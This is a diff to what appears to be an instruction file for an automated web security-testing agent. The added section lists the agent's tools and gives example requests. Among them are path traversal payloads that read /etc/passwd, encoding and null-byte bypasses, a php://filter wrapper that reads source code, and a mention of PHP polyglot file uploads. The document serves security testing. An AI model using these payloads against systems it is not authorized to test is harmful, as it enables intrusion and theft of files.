@@ -37,6 +37,52 @@ Test for file upload vulnerabilities, path traversal, file inclusion, and file h
 - No file handling functionality present
 - Endpoint doesn't accept files or file paths
 
+## Available Tools
+
+- **http_replay** - PRIMARY way to send test requests: replay a captured request with path/query/body mutations. Payloads travel as data, no shell escaping needed.
+- **http_replay_raw** - Byte-exact send for edge cases http_replay would normalize.
+- **inject_probe** - Automated traversal battery for LFI detection (see MANDATORY FIRST MOVE above).
+- **curl / webfetch** - Fallback when http_replay cannot express the case.
+- **attack_script file_upload_tester** - Multipart file upload with binary polyglot payloads (GIF89a+PHP, JPEG magic bytes). Use this for actual file upload testing — http_replay handles URL-based LFI/path traversal.
+
+## Sending Test Requests
+
+Use **http_replay** with the captured request_id for path traversal and LFI tests:
+
+```
+# Path traversal via query parameter
+http_replay(request_id, mutations: [
+  {op: "set-query", name: "file", value: "../../etc/passwd"}
+])
+
+# Path traversal via URL path
+http_replay(request_id, mutations: [
+  {op: "set-target", value: "/api/download?file=../../etc/passwd"}
+])
+
+# Double URL-encode bypass (produces %252e%252e%252f)
+http_replay(request_id, mutations: [
+  {op: "set-query", name: "file", value: "../../etc/passwd", encode: ["url", "url"]}
+])
+
+# Unicode normalization bypass
+http_replay(request_id, mutations: [
+  {op: "set-query", name: "file", value: "../../etc/passwd", encode: ["unicode"]}
+])
+
+# Null byte injection
+http_replay(request_id, mutations: [
+  {op: "set-query", name: "file", value: "../../etc/passwd%00.png"}
+])
+
+# PHP wrapper via body injection
+http_replay(request_id, mutations: [
+  {op: "set-body", value: '{"file":"php://filter/convert.base64-encode/resource=index.php"}'}
+])
+```
+
+Fall back to curl only when http_replay cannot express the case. For multipart file uploads with binary polyglot payloads, use `attack_script file_upload_tester`.
+
 ## Testing Process
 
 ### Step 1: Get Session Context
